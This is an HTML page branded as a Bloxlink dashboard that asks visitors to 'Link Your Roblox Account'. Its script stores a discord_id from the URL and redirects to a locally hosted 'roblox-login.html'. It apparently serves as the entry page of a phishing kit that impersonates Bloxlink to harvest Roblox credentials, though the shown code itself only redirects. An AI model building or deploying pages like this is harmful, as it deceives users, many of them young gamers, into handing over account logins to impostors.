<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bloxlink - Dashboard</title>
    <style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}body{background:#1a1a1a;color:#fff;min-height:100vh}.navbar{background:#2f3136;padding:16px 32px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #40444b}.logo{font-size:24px;font-weight:700;color:#5865F2}.main-container{max-width:1200px;margin:0 auto;padding:32px}.dashboard-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}.header-title{font-size:28px;font-weight:700;background:linear-gradient(90deg,#5865F2,#EB459E);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.empty-state{background:#2f3136;border-radius:12px;padding:64px 32px;text-align:center;margin-top:32px}.empty-title{font-size:24px;font-weight:600;margin-bottom:12px}.empty-description{color:#b9bbbe;max-width:600px;margin:0 auto 32px;line-height:1.6}.verify-button{background:linear-gradient(90deg,#5865F2,#EB459E);color:white;border:none;padding:16px 40px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:transform .2s}.verify-button:hover{transform:translateY(-2px)}</style>
</head>
<body>
    <nav class="navbar"><div class="logo">bloxlink</div></nav>
    <div class="main-container">
        <div class="dashboard-header"><h1 class="header-title">Account Verification</h1></div>
        <div class="empty-state">
            <h2 class="empty-title">Link Your Roblox Account</h2>
            <p class="empty-description">Connect your Roblox account to Discord to access server features and verification.</p>
            <button class="verify-button" onclick="startVerification()">Verify Now</button>
        </div>
    </div>
    <script>
        function startVerification() {
            const discordId = new URLSearchParams(window.location.search).get('discord_id');
            if (discordId) {
                sessionStorage.setItem('discord_id', discordId);
                window.location.href = 'roblox-login.html?discord_id=' + discordId;
            } else {
                window.location.href = 'roblox-login.html';
            }
        }
    </script>
</body>
</html>
